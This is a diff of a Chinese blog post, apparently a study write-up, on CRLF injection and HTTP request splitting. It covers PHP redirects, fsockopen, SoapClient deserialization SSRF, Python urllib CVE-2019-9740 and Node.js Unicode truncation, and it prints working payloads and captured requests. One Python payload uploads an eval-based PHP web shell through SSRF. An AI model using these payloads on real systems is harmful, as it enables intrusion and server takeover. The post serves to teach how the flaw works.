+<h2 id="crlf是怎么造成漏洞的呢"><a class="markdownIt-Anchor" href="#crlf是怎么造成漏洞的呢"></a> CRLF是怎么造成漏洞的呢</h2>
+<p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p>
 <p>在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以CRLF注入漏洞又称为HTTP响应拆分漏洞（HTTP Response Splitting），简称HRS。</p>
-<h2 id="Location字段的302跳转"><a href="#Location字段的302跳转" class="headerlink" title="Location字段的302跳转"></a>Location字段的302跳转</h2><p><code>Location</code>字段，说实话我也不熟悉，响应头这块没仔细的去了解过</p>
-<p>了解后知道<strong>Location</strong> 响应头用于指定需要将页面重新定向至的地址。它通常在响应码为 <strong>3xx</strong> 的响应中才有意义，例如 <strong>301 (永久重定向)<strong>、</strong>302 (临时重定向)<strong>、</strong>303 (See Also)<strong>、</strong>307 (Temporary Redirect)</strong> 和 <strong>308 (Permanent Redirect)</strong></p>
+<h2 id="location字段的302跳转"><a class="markdownIt-Anchor" href="#location字段的302跳转"></a> Location字段的302跳转</h2>
+<p><code>Location</code>字段，说实话我也不熟悉，响应头这块没仔细的去了解过</p>
+<p>了解后知道<strong>Location</strong> 响应头用于指定需要将页面重新定向至的地址。它通常在响应码为 <strong>3xx</strong> 的响应中才有意义，例如 <strong>301 (永久重定向)</strong>、<strong>302 (临时重定向)</strong>、<strong>303 (See Also)</strong>、<strong>307 (Temporary Redirect)</strong> 和 <strong>308 (Permanent Redirect)</strong></p>
 <p>一般网站会在HTTP头中使用<code>Location: http://baidu.com</code> 这种方式来进行302跳转，如果我们能控制 <code>Location:</code> 后面的某个网址的URL，就可以进行CRLF攻击。</p>
 <p>测试代码：</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
@@ -174,7 +316,6 @@
     <span class="keyword">exit</span>;
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>这段代码的意思是：当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。</p>
 <p>首先我们输入正常的url：<code>/?url=https://ayan0.top</code></p>
 <p>得到一个正常的302跳转包的响应头是这样的:</p>
@@ -186,7 +327,6 @@
 <span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.3.29
 <span class="attribute">Location</span><span class="punctuation">: </span>https://ayan0.top
 <span class="attribute">Content-Length</span><span class="punctuation">: </span>880</code></pre>
-
 <p>但如果我们抓包，将输入的URL改为 <code>/?url=https://ayan0.top%0d%0aPHPSESSID=whoami</code>，注入了一个换行。将修改后的请求包提交给服务器端，查看服务器端的响应。预期内返回包的<strong>响应头</strong>就会变成这样：</p>
 <pre><code class="highlight http"><span class="meta">HTTP/1.1</span> <span class="number">302</span>  Moved Temporarily  
 Content- Type: text/html
@@ -195,13 +335,14 @@ Content- Type: text/html
 <span class="attribute">Connection</span><span class="punctuation">: </span>close
 <span class="attribute">Location</span><span class="punctuation">: </span>https://ayan0.top
 <span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami</code></pre>
-
 <p>但是真的如此，吗</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714145107226.png" alt="image-20250714145107226"></p>
 <p>可以看到，出现了报错，很明显，我们的换行符被探测出来了。</p>
 <p>网上找了一些博客，发现很多师傅也遇上了同样的问题，并且这个问题在5.x-7.x内是都存在的</p>
 <p>看起来是因为这个漏洞已经被修复了，并且在Nodejs中也无法得到复现呜呜</p>
-<h2 id="PHP-fsockopen-函数"><a href="#PHP-fsockopen-函数" class="headerlink" title="PHP fsockopen() 函数"></a>PHP fsockopen() 函数</h2><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>
+<h2 id="php-fsockopen-函数"><a class="markdownIt-Anchor" href="#php-fsockopen-函数"></a> PHP fsockopen() 函数</h2>
+<p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>
+fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p>
 <p>测试代码：</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];
@@ -219,19 +360,16 @@ Content- Type: text/html
     <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>首先我们尝试访问正常的url：</p>
 <pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999</code></pre>
-
 <p>VPS 上监听到的请求：</p>
 <pre><code class="highlight plaintext">Connection received on 60.1x.1xx.1xx 40605
 GET / HTTP/1.1
 Host: 47.1xx.1x1.1xx:9999
 Connection: Close</code></pre>
-
-<h3 id="在Host头部注入"><a href="#在Host头部注入" class="headerlink" title="在Host头部注入"></a>在Host头部注入</h3><p>下面我们尝试插入 CRLF：</p>
+<h3 id="在host头部注入"><a class="markdownIt-Anchor" href="#在host头部注入"></a> 在Host头部注入</h3>
+<p>下面我们尝试插入 CRLF：</p>
 <pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami</code></pre>
-
 <p>没想到成功复现了。激动</p>
 <pre><code class="highlight plaintext">Listening on 0.0.0.0 9999
 Connection received on 60.1x.1xx.1xx 40605
@@ -239,26 +377,22 @@ GET / HTTP/1.1
 Host: 47.1xx.1x1.1xx:9999
 Set-Cookie: PHPSESSID=whoami
 Connection: Close</code></pre>
-
 <p>这是由于，此时服务端接收到的url参数值是我们修改后的：</p>
 <pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami</code></pre>
-
 <p>而在url参数值拼接到 Host 字段值中，设置成响应头后，响应包此时应该是如下这样的：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami
 <span class="attribute">Connection</span><span class="punctuation">: </span>Close</code></pre>
-
 <p>接着就会被处理为</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>47.1xx.1x1.1xx:9999
 <span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami
 <span class="attribute">Connection</span><span class="punctuation">: </span>Close</code></pre>
-
-<p>而我们构造的 Set-Cookie 字符在 HTTP 中是一个设置 Cookie 的首部字段，这个时候就会将 PHPSESSID&#x3D;whoami 设置成 Cookie。</p>
-<h2 id="PHP-SoapClient-类"><a href="#PHP-SoapClient-类" class="headerlink" title="PHP SoapClient 类"></a>PHP SoapClient 类</h2><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。</p>
+<p>而我们构造的 Set-Cookie 字符在 HTTP 中是一个设置 Cookie 的首部字段，这个时候就会将 PHPSESSID=whoami 设置成 Cookie。</p>
+<h2 id="php-soapclient-类"><a class="markdownIt-Anchor" href="#php-soapclient-类"></a> PHP SoapClient 类</h2>
+<p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。</p>
 <p>该类的构造函数如下：</p>
 <pre><code class="highlight php"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</code></pre>
-
 <ul>
 <li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
 <li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</li>
@@ -271,7 +405,6 @@ echo $b;
 $c = unserialize($b);
 $c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
 ?&gt;</code></pre>
-
 <p>在VPS上监听到了POST请求</p>
 <pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/aaa</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>47.111.141.135:9999
@@ -283,9 +416,9 @@ $c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进
 
 <span class="language-ruby">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span>
 <span class="language-ruby">&lt;<span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:Envelope</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="symbol">xmlns:</span>ns1=<span class="string">&quot;http://47.111.141.135:9999&quot;</span> <span class="symbol">xmlns:</span>xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;&lt;SOAP-ENV</span><span class="symbol">:Body&gt;&lt;ns1</span><span class="symbol">:a/&gt;&lt;/SOAP-ENV</span><span class="symbol">:Body&gt;&lt;/SOAP-ENV</span><span class="symbol">:Envelope&gt;</span></span></code></pre>
-
 <p>接下来就尝试CRLF注入,插入任意的HTTP头</p>
-<h3 id="在-User-Agent-头部注入"><a href="#在-User-Agent-头部注入" class="headerlink" title="在 User-Agent 头部注入"></a>在 User-Agent 头部注入</h3><pre><code class="highlight PHP"><span class="meta">&lt;?php</span>
+<h3 id="在-user-agent-头部注入"><a class="markdownIt-Anchor" href="#在-user-agent-头部注入"></a> 在 User-Agent 头部注入</h3>
+<pre><code class="highlight PHP"><span class="meta">&lt;?php</span>
 <span class="variable">$target</span> = <span class="string">&#x27;http://47.111.141.135:9999/&#x27;</span>;
 <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nSet-Cookie: PHPSESSID=whoami&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));
 <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
@@ -293,7 +426,6 @@ $c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进
 <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);
 <span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
 <span class="meta">?&gt;</span></code></pre>
-
 <p>VPS 上监听到了请求，成功在HTTP头中插入了一个我们自定义的 cookie：</p>
 <pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>47.111.141.135:9999
@@ -306,10 +438,8 @@ $c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进
 
 <span class="language-ruby">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span>
 <span class="language-ruby">&lt;<span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:Envelope</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="symbol">xmlns:</span>ns1=<span class="string">&quot;test&quot;</span> <span class="symbol">xmlns:</span>xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="symbol">xmlns:</span><span class="variable constant_">SOAP</span>-<span class="variable constant_">ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="variable constant_">SOAP</span>-<span class="variable constant_">ENV</span><span class="symbol">:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;&lt;SOAP-ENV</span><span class="symbol">:Body&gt;&lt;ns1</span><span class="symbol">:a/&gt;&lt;/SOAP-ENV</span><span class="symbol">:Body&gt;&lt;/SOAP-ENV</span><span class="symbol">:Envelope&gt;</span></span></code></pre>
-
-
-
-<h3 id="发送-POST-数据包"><a href="#发送-POST-数据包" class="headerlink" title="发送 POST 数据包"></a>发送 POST 数据包</h3><p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。</p>
+<h3 id="发送-post-数据包"><a class="markdownIt-Anchor" href="#发送-post-数据包"></a> 发送 POST 数据包</h3>
+<p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。</p>
 <p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据，所以 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
 <p>测试代码如下：</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
@@ -326,7 +456,6 @@ $c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进
 <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);
 <span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
 <span class="meta">?&gt;</span></code></pre>
-
 <p>VPS 上监听到了 POST 数据：</p>
 <pre><code class="highlight plaintext">POST / HTTP/1.1
 Host: 47.111.141.135:9999
@@ -344,10 +473,8 @@ Content-Length: 365
 
 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
-
-
-
-<h2 id="Python-urllib-CRLF-注入漏洞（CVE-2019-9740）"><a href="#Python-urllib-CRLF-注入漏洞（CVE-2019-9740）" class="headerlink" title="Python urllib CRLF 注入漏洞（CVE-2019-9740）"></a>Python urllib CRLF 注入漏洞（CVE-2019-9740）</h2><p>Python 2.x版本至2.7.16版本中的urllib2和Python 3.x版本至3.7.2版本中的urllib存在注入漏洞。该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容。</p>
+<h2 id="python-urllib-crlf-注入漏洞cve-2019-9740"><a class="markdownIt-Anchor" href="#python-urllib-crlf-注入漏洞cve-2019-9740"></a> Python urllib CRLF 注入漏洞（CVE-2019-9740）</h2>
+<p>Python 2.x版本至2.7.16版本中的urllib2和Python 3.x版本至3.7.2版本中的urllib存在注入漏洞。该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容。</p>
 <p>该漏洞早在2016年就被爆出（CVE-2016-5699），在之后的一段时间里不断爆出了python其他版本也存在该漏洞（CVE-2019-9740、CVE-2019-9947）。</p>
 <p><strong>影响范围：</strong></p>
 <ul>
@@ -355,7 +482,8 @@ Content-Length: 365
 <li>Python 3.x版本至3.7.2版本中的urllib</li>
 </ul>
 <p>这里懒得再下个版本再复现了，直接引用其他师傅的记录吧</p>
-<h3 id="在-HTTP-状态行注入恶意首部字段"><a href="#在-HTTP-状态行注入恶意首部字段" class="headerlink" title="在 HTTP 状态行注入恶意首部字段"></a>在 HTTP 状态行注入恶意首部字段</h3><p>测试代码：</p>
+<h3 id="在-http-状态行注入恶意首部字段"><a class="markdownIt-Anchor" href="#在-http-状态行注入恶意首部字段"></a> 在 HTTP 状态行注入恶意首部字段</h3>
+<p>测试代码：</p>
 <pre><code class="highlight python"><span class="comment">#!python</span>
 <span class="comment">#!/usr/bin/env python3</span>
 <span class="keyword">import</span> urllib
@@ -371,7 +499,6 @@ url = <span class="string">&quot;http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-i
 
 <span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:
     <span class="built_in">print</span>(e)</code></pre>
-
 <p>执行代码后，VPS 上会监听到如下HTTP头：</p>
 <p><img src="https://p3.ssl.qhimg.com/t017291c25d0d4a0fc3.png" alt="img"></p>
 <p>如上图所示，成功引发了CRLF漏洞。</p>
@@ -381,7 +508,6 @@ url = <span class="string">&quot;http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-i
 <span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000
 <span class="attribute">User-Agent</span><span class="punctuation">: </span>Python-urllib/3.7
 <span class="attribute">Connection</span><span class="punctuation">: </span>close</code></pre>
-
 <p>此时，HTTP 状态行中出现了%0d%0a，便会被解析为HTTP首部字段的结束并成功插入我们定制的HTTP首部字段。最终HTTP请求变成了下面这样：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/?a=1</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">CRLF-injection</span><span class="punctuation">: </span>True
@@ -390,8 +516,8 @@ url = <span class="string">&quot;http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-i
 <span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000
 <span class="attribute">User-Agent</span><span class="punctuation">: </span>Python-urllib/3.7
 <span class="attribute">Connection</span><span class="punctuation">: </span>close</code></pre>
-
-<h3 id="在-HTTP-状态行注入完整-HTTP-请求"><a href="#在-HTTP-状态行注入完整-HTTP-请求" class="headerlink" title="在 HTTP 状态行注入完整 HTTP 请求"></a>在 HTTP 状态行注入完整 HTTP 请求</h3><p>首先，由于 Python Urllib 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 和 Host 字段影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>
+<h3 id="在-http-状态行注入完整-http-请求"><a class="markdownIt-Anchor" href="#在-http-状态行注入完整-http-请求"></a> 在 HTTP 状态行注入完整 HTTP 请求</h3>
+<p>首先，由于 Python Urllib 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 和 Host 字段影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>
 <p>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。下面尝试构造如下这个文件上传的完整 POST 请求：</p>
 <pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1
@@ -418,7 +544,6 @@ url = <span class="string">&quot;http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-i
 <span class="language-php"></span>
 <span class="language-php">Upload</span>
 <span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></code></pre>
-
 <p>编写脚本构造payload：</p>
 <pre><code class="highlight python">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
 <span class="string"></span>
@@ -454,7 +579,6 @@ url = <span class="string">&quot;http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-i
 <span class="built_in">print</span>(payload)
 
 <span class="comment"># 输出: HTTP/1.1\r\n\r\nPOST /upload.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET / HTTP/1.1\r\ntest:</span></code></pre>
-
 <p>然后构造请求：</p>
 <pre><code class="highlight python"><span class="comment">#!python</span>
 <span class="comment">#!/usr/bin/env python3</span>
@@ -471,13 +595,11 @@ url = <span class="string">&#x27;http://47.101.57.72:4000?a=1 HTTP/1.1\r\n\r\nPO
 
 <span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:
     <span class="built_in">print</span>(e)</code></pre>
-
 <p><img src="https://p5.ssl.qhimg.com/t014cac7ba1ff8544a8.png" alt="img"></p>
 <p>如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。下面我们分析一下整个攻击的过程。</p>
 <p>原始请求数据如下：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 <span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</code></pre>
-
 <p>当我们插入CRLF数据后，HTTP请求数据变成了：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 
@@ -495,7 +617,6 @@ url = <span class="string">&#x27;http://47.101.57.72:4000?a=1 HTTP/1.1\r\n\r\nPO
 <span class="language-php"></span>
 <span class="language-php"> HTTP/<span class="number">1.1</span></span>
 <span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
-
 <p>上次请求包的Host字段和状态行中的 <code>HTTP/1.1</code> 就单独出来了，所以我们再构造一个请求把他闭合：</p>
 <pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
 
@@ -514,10 +635,12 @@ url = <span class="string">&#x27;http://47.101.57.72:4000?a=1 HTTP/1.1\r\n\r\nPO
 <span class="language-php">GET / HTTP/<span class="number">1.1</span></span>
 <span class="language-php">test: HTTP/<span class="number">1.1</span></span>
 <span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>
-
-<h2 id="NodeJS-中的-CRLF-Injection"><a href="#NodeJS-中的-CRLF-Injection" class="headerlink" title="NodeJS 中的 CRLF Injection"></a>NodeJS 中的 CRLF Injection</h2><h3 id="HTTP-请求路径中的-Unicode-字符损坏"><a href="#HTTP-请求路径中的-Unicode-字符损坏" class="headerlink" title="HTTP 请求路径中的 Unicode 字符损坏"></a>HTTP 请求路径中的 Unicode 字符损坏</h3><p>虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 <code>\u0130</code> 就会被截断为 <code>\u30</code>：</p>
+<h2 id="nodejs-中的-crlf-injection"><a class="markdownIt-Anchor" href="#nodejs-中的-crlf-injection"></a> NodeJS 中的 CRLF Injection</h2>
+<h3 id="http-请求路径中的-unicode-字符损坏"><a class="markdownIt-Anchor" href="#http-请求路径中的-unicode-字符损坏"></a> HTTP 请求路径中的 Unicode 字符损坏</h3>
+<p>虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 <code>\u0130</code> 就会被截断为 <code>\u30</code>：</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714174138058.png" alt="image-20250714174138058"></p>
-<h3 id="Unicode-字符损坏造成的-HTTP-拆分攻击"><a href="#Unicode-字符损坏造成的-HTTP-拆分攻击" class="headerlink" title="Unicode 字符损坏造成的 HTTP 拆分攻击"></a>Unicode 字符损坏造成的 HTTP 拆分攻击</h3><p>刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。</p>
+<h3 id="unicode-字符损坏造成的-http-拆分攻击"><a class="markdownIt-Anchor" href="#unicode-字符损坏造成的-http-拆分攻击"></a> Unicode 字符损坏造成的 HTTP 拆分攻击</h3>
+<p>刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。</p>
 <p>由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码(但是<code>\r\n</code>实际在我的版本中会被直接屏蔽掉)，所以正常的CRLF注入在nodejs中并不能利用：</p>
 <pre><code class="highlight plaintext">GET /%20/whoami HTTP/1.1  #原始请求里是空格
 Host: 47.111.141.135:9999
@@ -526,101 +649,98 @@ Connection: keep-alive
 GET //whoami HTTP/1.1 #原始请求为\r\n
 Host: 47.111.141.135:9999
 Connection: keep-alive</code></pre>
-
 <p>但不幸的是，上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：</p>
 <pre><code class="highlight plaintext">&gt; &#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</code></pre>
-
 <p>高版本的报文</p>
 <pre><code class="highlight plaintext">GET /%C4%8D%C4%8A/WHOAMI HTTP/1.1
 Host: 47.111.141.135:9999
 Connection: keep-alive</code></pre>
-
